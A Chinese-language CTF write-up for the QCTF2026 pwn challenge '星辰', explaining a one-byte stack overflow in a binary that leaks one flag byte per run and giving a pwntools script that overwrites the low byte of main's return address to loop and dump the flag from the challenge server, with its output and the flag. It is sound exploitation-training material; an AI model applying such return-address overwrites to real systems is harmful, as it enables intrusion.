---
title: 星辰（QCTF2026 pwn）
date: 2026-10-21
category: Pwn
tags:
  - CTF
  - Writeup
  - pwn
draft: false
summary: "虽然但是这道题确实只给我们反馈了一个字，我们 要做的和题目说的一样：更改返回地址让flag里面的内容一个个都反馈出来"
collection: QCTF2026
---
# 星辰

## 第一节：题目

虽然但是这道题确实只给我们反馈了一个字，我们 要做的和题目说的一样：更改返回地址让flag里面的内容一个个都反馈出来
## 第二节：过程

这道题给了我们三个附件：pwn的文件，自带的libc和自带的动态链接器
而libc在这里相当于告诉我们了固定的偏移，确定的libc版本 = 确定的返回地址。

之后我们依旧打开IDA shift+F12然后点一个 Do you like it进去看看在程序里它位于什么位置
![](/assets/posts/qctf2026/qctf2026-pwn-stars-1.png)
看到了里面的main函数，然后点进去反汇编一下，得到了
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+Fh] [rbp-41h] BYREF
  _BYTE v5[60]; // [rsp+10h] [rbp-40h] BYREF
  int v6; // [rsp+4Ch] [rbp-4h]

  sub_1209(a1, a2, a3);
  puts(s: "Welcome to the program!");
  puts(s: "Do you want to see the content of the flag?");
  puts(s: "I can open and read the flag for you.");
  v6 = open(file: "flag", oflag: 0); //打开flag拿一个描述符
  if ( v6 < 0 )
  {
    perror(s: "open");
    exit(status: 1);
  }
  read(fd: 3, &buf, nbytes: 1u);
  puts(s: "Here is the content of the document, but just one byte:");
  printf(format: "%c\n", (unsigned int)buf);
  puts(s: "Do you like it?");
  read(fd: 0, buf: v5, nbytes: 0x49u);
  return 0;
}
```
关键就在于v6，v6除了判断<0以外就再也没有用过——也就是说不管第几次打开，读的都是fd，同一个fd的偏移量相同，最终指向了flag，因此每次都会返回上一个flag字段的下一个字段，感觉说着晕晕的，就是flag返回出来是严格顺序而不是随机的。
而刚刚没展示出来的sub1209是
```c
void sub_1209()
{
  setbuf(stream: stdout, buf: nullptr);
  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stderr, buf: nullptr);
}
```
也就是说在v6执行之前012已经被这三个占了，所以open返回值一定是3。
缓冲区是从rbp-0x40开始，v5的60个字节到v6的4个字节一共64字节，但是read函数读到的却是0x49，一共73字节，64个在缓冲区的字节加上8个rbp是72，比73少了一个！发现了溢出，多溢出的一个字节，下面我们会说。
但是另外一个问题在于，因为return 0 ，导致执行一次只返回一个字段，所以我们要循环调用main，这个时候恍然大悟的来了——如果我们把溢出的那一个字节给改成main返回的地址...那在死循环的同时也可以把flag完整的打出来了！
我们用IDA打开libc，alt+b搜机器码48 8B 44 24 08 FF D0观察到
![](/assets/posts/qctf2026/qctf2026-pwn-stars-2.png)
mov rax  [rsp+98h+var_90] 是取出main指针而最下面那一行是main的返回地址
我们要改的就是这个返回地址，把最低字节从0x90改成0x89，这样的话就相当于重新来了一遍main，那接下来我们写个脚本，每次拿到一个字符都回72个字母加一个字节\x89让main再跑一次，当然因为键盘上没有\x89所以手打打肯定不可以了...
py -3.12 exp.py host port
```python
from pwn import *
import sys

io = remote(sys.argv[1], int(sys.argv[2]))
flag = b""
while not flag.endswith(b"}"):
    io.recvuntil(b"one byte:\n")         
    flag += io.recv(1)                    
    io.recvuntil(b"Do you like it?")      
    io.send(b"A" * 72 + (b"\x90" if flag.endswith(b"}") else b"\x89"))

print(flag.decode())

```
最后的命令是这样的
```bash
Z:\laragon\ctf\challenges\Qctf\PWN\01\attachment (1)>py -3.12 de.py nc1.ctfplus.cn 14683
[x] Opening connection to nc1.ctfplus.cn on port 14683
[x] Opening connection to nc1.ctfplus.cn on port 14683: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 14683: Done
flag{f35fdfdf-56ab-4c7f-891a-0acc589916b6}
[*] Closed connection to nc1.ctfplus.cn port 14683
```

复现flag
`flag{f35fdfdf-56ab-4c7f-891a-0acc589916b6}`